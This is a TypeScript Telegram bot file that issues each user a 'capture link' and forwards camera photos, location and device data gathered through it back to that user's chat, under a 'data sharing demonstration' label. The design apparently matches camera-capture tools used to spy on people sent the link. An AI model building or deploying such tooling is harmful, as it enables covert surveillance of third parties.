import TelegramBot from "node-telegram-bot-api";
import { logger } from "./logger";

const token = process.env.TELEGRAM_BOT_TOKEN;

if (!token) {
  throw new Error("TELEGRAM_BOT_TOKEN environment variable is required");
}

export const bot = new TelegramBot(token, { polling: true });

const BASE_DOMAIN = process.env.REPLIT_DEV_DOMAIN
  ? `https://${process.env.REPLIT_DEV_DOMAIN}`
  : process.env.REPLIT_DOMAINS
    ? `https://${process.env.REPLIT_DOMAINS.split(",")[0]}`
    : "http://localhost:80";

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const firstName = msg.from?.first_name ?? "User";

  const captureLink = `${BASE_DOMAIN}/?chat_id=${chatId}`;

  const text =
    `Namaste ${firstName}! 👋\n\n` +
    `Yeh ek data sharing demonstration hai.\n\n` +
    `Neeche diye gaye link par click karein. Wahan aapko clearly bataya jayega ki kya-kya information share hogi (camera photo, location, device info). Aap khud decide karenge ki share karna chahte hain ya nahi.\n\n` +
    `🔗 Link: ${captureLink}\n\n` +
    `Allow karne ke baad, aapki information seedha is bot par aa jayegi.`;

  bot.sendMessage(chatId, text).catch((err: unknown) => {
    logger.error({ err, chatId }, "Failed to send start message");
  });

  logger.info({ chatId, firstName }, "Start command received");
});

bot.on("polling_error", (err) => {
  logger.error({ err }, "Telegram polling error");
});

logger.info("Telegram bot started (polling mode)");

export async function sendTextToChat(chatId: string, text: string): Promise<void> {
  await bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
}

export async function sendPhotoToChat(
  chatId: string,
  photoBase64: string,
  caption?: string,
): Promise<void> {
  // Strip data URL prefix if present
  const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, "");
  const buffer = Buffer.from(base64Data, "base64");
  await bot.sendPhoto(chatId, buffer, { caption });
}
